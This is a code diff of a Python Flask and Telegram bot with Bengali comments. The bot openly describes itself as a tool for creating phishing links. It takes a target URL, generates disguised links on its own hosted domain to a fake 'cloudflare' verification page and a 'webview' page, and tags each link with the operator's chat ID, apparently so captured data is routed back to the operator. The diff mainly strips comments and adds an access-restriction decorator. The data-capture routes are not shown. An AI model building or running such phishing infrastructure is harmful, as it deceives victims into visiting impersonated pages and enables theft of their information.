@@ -3,7 +3,6 @@ import json
 import logging
 from threading import Thread
 import telegram
-
 from flask import Flask, request, render_template, jsonify
 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
 
@@ -14,7 +13,7 @@ logger = logging.getLogger(__name__)
 
 # টেলিগ্রাম এবং ফিশিং লজিকের জন্য প্রয়োজনীয় ভেরিয়েবল
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
-TARGET_CHAT_ID = os.environ.get("TARGET_CHAT_ID") # তোমার নিজস্ব চ্যাট আইডি
+TARGET_CHAT_ID = os.environ.get("TARGET_CHAT_ID")
 PORT = int(os.environ.get('PORT', 5000))
 
 # অনুমোদিত ব্যবহারকারীদের তালিকা লোড করা
@@ -29,7 +28,7 @@ def load_allowed_users():
 
 ALLOWED_USERS = load_allowed_users()
 
-# ইউজার আইডি যাচাই করার জন্য ডেকোরেটর (Decorator)
+# ইউজার আইডি যাচাই করার জন্য ডেকোরেটর
 def restricted(func):
     def wrapped(update, context, *args, **kwargs):
         user_id = update.effective_user.id
@@ -44,6 +43,7 @@ def restricted(func):
 app = Flask(__name__)
 
 # টেলিগ্রাম বট লজিক
+@restricted
 def start(update, context):
     update.message.reply_text('নমস্কার! /create কমান্ড ব্যবহার করে একটি ফিশিং লিংক তৈরি করুন।')
 
@@ -58,10 +58,7 @@ def handle_message(update, context):
     if context.user_data.get('waiting_for_link'):
         original_url = update.message.text
         if original_url.startswith('http'):
-            # এখানে তোমার রেন্ডার সার্ভিসের ডোমেইন নেম ব্যবহার করতে হবে
-            # যেমন: https://my-telegram-bot.onrender.com
             base_url = "https://" + os.environ.get('RENDER_EXTERNAL_HOSTNAME')
-
             cloudflare_link = f"{base_url}/cloudflare?target={original_url}&chat_id={user_id}"
             webview_link = f"{base_url}/webview?target={original_url}&chat_id={user_id}"
 
@@ -78,7 +75,6 @@ def handle_message(update, context):
 # Flask ওয়েব সার্ভার লজিক
 @app.route('/cloudflare')
 def serve_cloudflare_page():
-    # 'target' এবং 'chat_id' প্যারামিটার URL থেকে নেওয়া হচ্ছে
     original_url = request.args.get('target', 'about:blank')
     chat_id = request.args.get('chat_id')
     return render_template('cloudflare.ejs', original_url=original_url, chat_id=chat_id)
@@ -142,7 +138,6 @@ def run_flask_app():
     app.run(host='0.0.0.0', port=PORT)
 
 if __name__ == '__main__':
-    # দুটি থ্রেডে বট এবং ওয়েব সার্ভার একসাথে চালানো
     thread_bot = Thread(target=run_telegram_bot)
     thread_flask = Thread(target=run_flask_app)
     thread_bot.start()
